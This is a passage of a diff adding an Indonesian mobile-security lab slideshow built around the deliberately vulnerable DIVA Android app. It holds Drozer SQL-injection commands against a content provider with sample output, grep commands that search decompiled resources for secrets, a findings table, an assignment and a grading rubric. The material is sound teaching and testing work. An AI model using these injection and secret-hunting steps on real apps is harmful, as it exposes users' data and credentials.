+<span class="out">| id | name    |
+| 1  | Alice   |
+| 2  | Bob     |</span>
+        </div>
+      </div>
+      <div>
+        <h3 class="section-h">Uji SQL Injection via Content Provider</h3>
+        <div class="code-block">
+<span class="comment"># Coba SQLi melalui Content Provider</span>
+<span class="cmd">dz> run app.provider.query</span>
+<span class="cmd">   content://jakhar.aseem.diva.names</span>
+<span class="cmd">   --selection "1=1--"</span>
+<span class="out">| id | name    |
+| 1  | Alice   |
+| 2  | Bob     |
+(seluruh data terekspos!)</span>
+
+<span class="comment"># Scan otomatis untuk SQL injection</span>
+<span class="cmd">dz> run scanner.provider.injection</span>
+<span class="cmd">   -a jakhar.aseem.diva</span>
+<span class="out">Not Vulnerable: ...
+Injection in Projection: ...
+Injection in Selection: content://jakhar.aseem.diva.notes</span>
+        </div>
+        <div class="warn-box mt12">
+          <div class="warn-label">Dokumentasi</div>
+          <p>Screenshot semua output Drozer termasuk attack surface, query normal, dan uji injeksi. Sertakan perintah yang digunakan dan output lengkap.</p>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- SLIDE 8: LAB BROKEN AUTH -->
+<div class="slide" id="s8" data-title="Lab 6E — Broken Authentication & Hardcoded Creds">
+  <div class="slide-header">
+    <div class="section-label">Lab 6E</div>
+    <h2>Broken Authentication & Hardcoded Credentials di DIVA</h2>
+    <p>Challenge "Hardcoded Issues" dan "Insecure Authentication" di DIVA Android</p>
+  </div>
+  <div class="slide-body">
+    <div class="two-col">
+      <div>
+        <h3 class="section-h">Challenge: Hardcoded Issues — Part 1</h3>
+        <p style="font-size:13px;color:#555;margin-bottom:8px;">Tujuan: Temukan vendor key yang hardcoded dalam kode aplikasi</p>
+        <div class="step-v">
+          <div class="step-v-item">
+            <div class="step-v-num" style="background:#c0392b;">1</div>
+            <div class="step-v-body">
+              <h5>Decompile dengan Jadx</h5>
+              <p>Buka <code>jakhar/aseem/diva/HardCodeActivity.java</code> di Jadx</p>
+            </div>
+          </div>
+          <div class="step-v-item">
+            <div class="step-v-num" style="background:#e67e22;">2</div>
+            <div class="step-v-body">
+              <h5>Temukan String Hardcoded</h5>
+              <p>Cari private static final String dengan nilai yang mencurigakan (vendor key, API key)</p>
+            </div>
+          </div>
+          <div class="step-v-item">
+            <div class="step-v-num" style="background:#27ae60;">3</div>
+            <div class="step-v-body">
+              <h5>Verifikasi di Aplikasi</h5>
+              <p>Masukkan vendor key yang ditemukan ke field di aplikasi → konfirmasi berhasil login</p>
+            </div>
+          </div>
+        </div>
+        <div class="success-box mt8">
+          <div class="suc-label">Berhasil jika</div>
+          <p>Menemukan exact string yang digunakan sebagai vendor key dan berhasil memasukkannya ke field verifikasi di DIVA.</p>
+        </div>
+      </div>
+      <div>
+        <h3 class="section-h">Challenge: Hardcoded Issues — Part 2</h3>
+        <p style="font-size:13px;color:#555;margin-bottom:8px;">Credential tersembunyi di resources atau file binary</p>
+        <div class="code-block">
+<span class="comment"># Cari di resources DIVA</span>
+<span class="cmd">grep -r "password\|secret\|pin" \</span>
+<span class="cmd">  diva_output/resources/</span>
+
+<span class="comment"># Cari di file strings.xml</span>
+<span class="cmd">grep -i "key\|secret" \</span>
+<span class="cmd">  diva_output/resources/res/values/strings.xml</span>
+
+<span class="comment"># Cari di BuildConfig</span>
+<span class="cmd">cat diva_output/sources/jakhar/aseem/</span>
+<span class="cmd">diva/BuildConfig.java</span>
+        </div>
+        <div class="finding-card mt8" style="border-left-color:#c0392b;">
+          <h4 style="color:#c0392b;">Finding Template — Hardcoded Credential</h4>
+          <p><strong>ID:</strong> FIND-HC-01<br>
+          <strong>File:</strong> HardCodeActivity.java:18<br>
+          <strong>Deskripsi:</strong> Vendor key tersimpan sebagai plaintext string di source code<br>
+          <strong>Severity:</strong> <span class="tag-red">HIGH</span> | <strong>OWASP:</strong> M1<br>
+          <strong>Rekomendasi:</strong> Simpan di server-side, gunakan Android Keystore atau obfuscation</p>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- SLIDE 9: REKAP TEMUAN LAB 6 -->
+<div class="slide" id="s9" data-title="Rekapitulasi Temuan Lab 6">
+  <div class="slide-header">
+    <div class="section-label">Rekapitulasi</div>
+    <h2>Rekapitulasi Temuan Lab 6</h2>
+    <p>Rangkuman semua kerentanan yang ditemukan beserta risk score awal</p>
+  </div>
+  <div class="slide-body">
+    <table class="cmp-table">
+      <thead>
+        <tr>
+          <th>ID</th>
+          <th>Kerentanan</th>
+          <th>Lab</th>
+          <th>Lokasi</th>
+          <th>OWASP M</th>
+          <th>Likelihood</th>
+          <th>Impact</th>
+          <th>Severity</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td>F-01</td>
+          <td>SQL Injection (Login)</td>
+          <td>6B</td>
+          <td>SQLInjectionActivity.java</td>
+          <td>M4</td>
+          <td><span class="tag-red">H 7.5</span></td>
+          <td><span class="tag-red">H 8.0</span></td>
+          <td><span style="background:#c0392b;color:white;border-radius:4px;padding:2px 7px;font-size:11px;font-weight:700;">HIGH</span></td>
+        </tr>
+        <tr>
+          <td>F-02</td>
+          <td>Hardcoded Vendor Key</td>
+          <td>6E</td>
+          <td>HardCodeActivity.java:18</td>
+          <td>M1</td>
+          <td><span class="tag-red">H 8.0</span></td>
+          <td><span class="tag-red">H 7.5</span></td>
+          <td><span style="background:#c0392b;color:white;border-radius:4px;padding:2px 7px;font-size:11px;font-weight:700;">HIGH</span></td>
+        </tr>
+        <tr>
+          <td>F-03</td>
+          <td>Credentials di SharedPrefs</td>
+          <td>6C</td>
+          <td>SharedPreferences XML</td>
+          <td>M9</td>
+          <td><span class="tag-orange">M 5.5</span></td>
+          <td><span class="tag-red">H 7.0</span></td>
+          <td><span style="background:#c0392b;color:white;border-radius:4px;padding:2px 7px;font-size:11px;font-weight:700;">HIGH</span></td>
+        </tr>
+        <tr>
+          <td>F-04</td>
+          <td>Credentials di External Storage</td>
+          <td>6C</td>
+          <td>/sdcard/uinfo</td>
+          <td>M9</td>
+          <td><span class="tag-orange">M 6.0</span></td>
+          <td><span class="tag-red">H 7.0</span></td>
+          <td><span style="background:#c0392b;color:white;border-radius:4px;padding:2px 7px;font-size:11px;font-weight:700;">HIGH</span></td>
+        </tr>
+        <tr>
+          <td>F-05</td>
+          <td>Content Provider SQLi</td>
+          <td>6D</td>
+          <td>Content Provider (notes URI)</td>
+          <td>M4</td>
+          <td><span class="tag-orange">M 5.5</span></td>
+          <td><span class="tag-orange">M 6.0</span></td>
+          <td><span style="background:#d35400;color:white;border-radius:4px;padding:2px 7px;font-size:11px;font-weight:700;">MED-HIGH</span></td>
+        </tr>
+        <tr>
+          <td>F-06</td>
+          <td>Sensitive Data di Logcat</td>
+          <td>6C</td>
+          <td>Log.d() di source code</td>
+          <td>M9</td>
+          <td><span class="tag-orange">M 4.5</span></td>
+          <td><span class="tag-orange">M 4.5</span></td>
+          <td><span style="background:#d35400;color:white;border-radius:4px;padding:2px 7px;font-size:11px;font-weight:700;">MEDIUM</span></td>
+        </tr>
+      </tbody>
+    </table>
+    <div class="two-col mt12">
+      <div class="info-box">
+        <p><strong>Statistik Temuan Lab 6:</strong><br>
+        CRITICAL: 0 | HIGH: 4 | MEDIUM: 2 | LOW: 0<br>
+        Total: 6 kerentanan dari 4 sub-lab</p>
+      </div>
+      <div class="tip-box">
+        <div class="tip-label">Untuk Laporan</div>
+        <p>Temuan F-01 hingga F-06 ini akan digabungkan dengan temuan Lab 7 (kriptografi & otorisasi) untuk membentuk laporan pengujian final yang lengkap.</p>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- SLIDE 10: TUGAS & LAPORAN -->
+<div class="slide" id="s10" data-title="Tugas & Laporan Praktikum 6">
+  <div class="slide-header">
+    <div class="section-label">Penugasan</div>
+    <h2>Tugas & Laporan Praktikum 6</h2>
+    <p>Sub-CPMK 262.1 & 262.2 | Dikumpulkan sebelum Pertemuan 7 via LMS</p>
+  </div>
+  <div class="slide-body">
+    <div class="task-card" style="border-left-color:#c0392b;">
+      <div class="task-meta">
+        <span class="task-badge tb-red">Lab Report 6</span>
+        <span class="task-badge tb-blue">Sub-CPMK 262.1 & 262.2</span>
+        <span class="task-badge tb-gold">Bobot 30%</span>
+      </div>
+      <h4>Laporan Pengujian Praktikum 6 — Individual</h4>
+      <ul>
+        <li><strong>Bagian 1 — Setup:</strong> Screenshot environment berhasil terkonfigurasi (ADB devices, MobSF summary)</li>
+        <li><strong>Bagian 2 — Analisis Statis:</strong> Ringkasan temuan MobSF + 2 temuan dari Jadx dengan kutipan kode</li>
+        <li><strong>Bagian 3 — Pengujian Dinamis:</strong> Dokumentasi Lab 6B (SQLi), 6C (Data Storage), 6D (Drozer), 6E (Hardcoded)</li>
+        <li><strong>Bagian 4 — Tabel Temuan:</strong> Minimum 5 kerentanan dengan OWASP Risk Score masing-masing</li>
+        <li><strong>Bagian 5 — Rekomendasi:</strong> Minimal 1 rekomendasi teknis per temuan HIGH</li>
+        <li><strong>Format:</strong> PDF 5–8 halaman, nama file: <code>NIM_Lab6_RKS222.pdf</code></li>
+      </ul>
+    </div>
+    <div class="task-card mt12" style="border-left-color:#27ae60;">
+      <div class="task-meta">
+        <span class="task-badge tb-green">Bonus Task</span>
+        <span class="task-badge tb-purple">Opsional +10 Poin</span>
+      </div>
+      <h4>Tambahan: Frida Hooking Runtime</h4>
+      <p>Jalankan Frida script untuk hooking <code>rawQuery()</code> dan tangkap parameter query yang melintas saat runtime. Sertakan script Frida dan output sebagai lampiran bonus.</p>
+    </div>
+    <div class="info-box mt12">
+      <p><strong>Deadline:</strong> Dikumpulkan via LMS poltekssn.co.id sebelum Pertemuan 7. Laporan ini menjadi bagian dari portofolio akhir semester bersama Lab 7.</p>
+    </div>
+  </div>
+</div>
+
+<!-- SLIDE 11: RUBRIK PENILAIAN -->
+<div class="slide" id="s11" data-title="Rubrik Penilaian Lab 6">
+  <div class="slide-header">
+    <div class="section-label">Penilaian</div>
+    <h2>Rubrik Penilaian Praktikum 6</h2>
+    <p>Sub-CPMK 262.1 & 262.2 | Total 100 Poin</p>
+  </div>
+  <div class="slide-body">
+    <table class="rubrik-table">
+      <thead>
+        <tr>
+          <th style="text-align:left;width:28%;">Komponen</th>
+          <th>Bobot</th>
+          <th>Sangat Baik (90–100)</th>
+          <th>Baik (75–89)</th>
+          <th>Cukup (60–74)</th>
+          <th>Kurang (&lt;60)</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td>Setup & Konfigurasi</td>
+          <td>10%</td>
+          <td>Semua tool berhasil, screenshot lengkap</td>
+          <td>3 dari 4 tool berhasil</td>
+          <td>Hanya 2 tool berjalan</td>
+          <td>Gagal setup</td>
+        </tr>
+        <tr>
+          <td>Analisis Statis (MobSF+Jadx)</td>
+          <td>20%</td>
+          <td>Laporan MobSF + 3 temuan Jadx dengan kode</td>
+          <td>Laporan MobSF + 2 temuan</td>
+          <td>Hanya MobSF summary</td>
+          <td>Tidak ada bukti</td>
+        </tr>
+        <tr>
+          <td>Eksploitasi Dinamis (SQLi, Storage)</td>
+          <td>35%</td>
+          <td>5+ temuan dinamis dengan PoC lengkap</td>
+          <td>3–4 temuan dengan bukti</td>
+          <td>1–2 temuan</td>
+          <td>Tidak ada eksploitasi</td>
+        </tr>
+        <tr>
+          <td>Pengujian IPC/Drozer</td>
+          <td>15%</td>
+          <td>Attack surface + SQLi via Content Provider</td>
+          <td>Attack surface scan saja</td>
+          <td>Drozer connect berhasil</td>
+          <td>Tidak menggunakan Drozer</td>
+        </tr>
+        <tr>
+          <td>Risk Score & Rekomendasi</td>
+          <td>20%</td>
+          <td>OWASP Risk Score benar + rekomendasi spesifik per temuan</td>
+          <td>Risk score ada tapi rekomendasi umum</td>
+          <td>Hanya severity label</td>
+          <td>Tidak ada analisis risiko</td>
+        </tr>
+      </tbody>
+    </table>
+    <div class="two-col mt16">
+      <div class="warn-box">
+        <div class="warn-label">Integritas Akademik</div>
+        <p>Laporan harus dikerjakan secara mandiri. Copy-paste laporan antar mahasiswa akan mendapat nilai 0 dan dilaporkan ke komite disiplin.</p>
+      </div>
+      <div class="tip-box">
+        <div class="tip-label">Tips Nilai Tinggi</div>
+        <p>Sertakan penjelasan MENGAPA setiap temuan berbahaya, bukan hanya APA yang ditemukan. Rekomendasi dengan referensi kode spesifik (baris dan file) mendapat nilai lebih tinggi.</p>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- SLIDE 12: PENUTUP -->
+<div class="slide" id="s12" data-title="Penutup & Persiapan Lab 7">
+  <div class="slide-header">
+    <div class="section-label">Penutup</div>
+    <h2>Penutup & Persiapan Lab 7</h2>
+    <p>Ringkasan Lab 6 dan preview Lab 7 — Kriptografi & Otorisasi</p>
+  </div>
+  <div class="slide-body">
+    <div class="two-col">
+      <div>
+        <h3 class="section-h">Yang Sudah Dicapai di Lab 6</h3>
+        <div class="step-v">
+          <div class="step-v-item">
+            <div class="step-v-num" style="background:#27ae60;">✓</div>
+            <div class="step-v-body">
+              <h5>Analisis Statis APK</h5>
+              <p>MobSF report + decompile Jadx → temukan kerentanan tanpa menjalankan app</p>
+            </div>
+          </div>
+          <div class="step-v-item">
+            <div class="step-v-num" style="background:#27ae60;">✓</div>
+            <div class="step-v-body">
+              <h5>Eksploitasi SQLi Mobile</h5>
+              <p>Payload pada DIVA login + Content Provider injection via Drozer</p>
+            </div>
+          </div>
+          <div class="step-v-item">
+            <div class="step-v-num" style="background:#27ae60;">✓</div>
+            <div class="step-v-body">
+              <h5>Data Storage Analysis</h5>
+              <p>Ekstrak SharedPrefs, SQLite, External Storage via ADB — data sensitif plaintext</p>
+            </div>
+          </div>
+          <div class="step-v-item">
+            <div class="step-v-num" style="background:#27ae60;">✓</div>
+            <div class="step-v-body">
+              <h5>Dokumentasi Temuan</h5>
+              <p>Tabel 6 temuan dengan OWASP Risk Score awal — siap digabung ke laporan final</p>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div>
+        <h3 class="section-h">Preview Lab 7</h3>
+        <div class="card" style="border-left:4px solid #1abc9c;margin-bottom:10px;">
+          <h3 style="color:#0e6655;font-size:13px;">Lab 7A — Analisis Kriptografi</h3>
+          <p>Frida script untuk hook javax.crypto.Cipher → tangkap algoritma dan kunci saat runtime. Deteksi AES-ECB mode dan MD5 hashing.</p>
+        </div>
+        <div class="card" style="border-left:4px solid #8e44ad;margin-bottom:10px;">
+          <h3 style="color:#7d3c98;font-size:13px;">Lab 7B — Pengujian Otorisasi</h3>
+          <p>Burp Suite sebagai proxy mobile → intercept API request → uji IDOR dengan Intruder → analisis JWT token.</p>
+        </div>
+        <div class="card" style="border-left:4px solid #27ae60;">
+          <h3 style="color:#1e8449;font-size:13px;">Lab 7C — Laporan Final</h3>
+          <p>Gabungkan temuan Lab 6 + Lab 7 → susun laporan pengujian lengkap (Sub-CPMK 262.2).</p>
+        </div>
+        <div class="info-box mt12">
+          <p><strong>Persiapan Lab 7:</strong> Install Frida CLI (<code>pip install frida-tools</code>) dan Objection (<code>pip install objection</code>). Pastikan Frida Server berjalan di emulator.</p>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+</div><!-- end #slideshow -->
+
+<!-- NAVBAR -->
+<div id="navbar">
+  <button class="nav-btn" id="btn-prev" onclick="changeSlide(-1)" disabled>← Sebelumnya</button>
+  <div id="slide-title-bar">Cover</div>
+  <div id="progress-bar"><div id="progress-fill" style="width:7.7%"></div></div>
+  <div id="slide-counter">1 / 13</div>
+  <button class="nav-btn" id="btn-next" onclick="changeSlide(1)">Berikutnya →</button>
+</div>
+
+<script>
+  const slides = document.querySelectorAll('.slide');
+  let cur = 0;
+  const total = slides.length;
+  function showSlide(n) {
+    slides[cur].classList.remove('active');
+    cur = Math.max(0, Math.min(n, total - 1));
+    slides[cur].classList.add('active');
+    slides[cur].scrollTop = 0;
+    document.getElementById('btn-prev').disabled = cur === 0;
+    document.getElementById('btn-next').disabled = cur === total - 1;
+    document.getElementById('slide-counter').textContent = (cur+1) + ' / ' + total;
+    document.getElementById('progress-fill').style.width = ((cur+1)/total*100) + '%';
+    document.getElementById('slide-title-bar').textContent = slides[cur].dataset.title || '';
+  }
+  function changeSlide(d) { showSlide(cur + d); }
+  document.addEventListener('keydown', e => {
+    if (e.key === 'ArrowRight' || e.key === 'ArrowDown') changeSlide(1);
+    if (e.key === 'ArrowLeft'  || e.key === 'ArrowUp')   changeSlide(-1);
+  });
+</script>
+</body>
+</html>
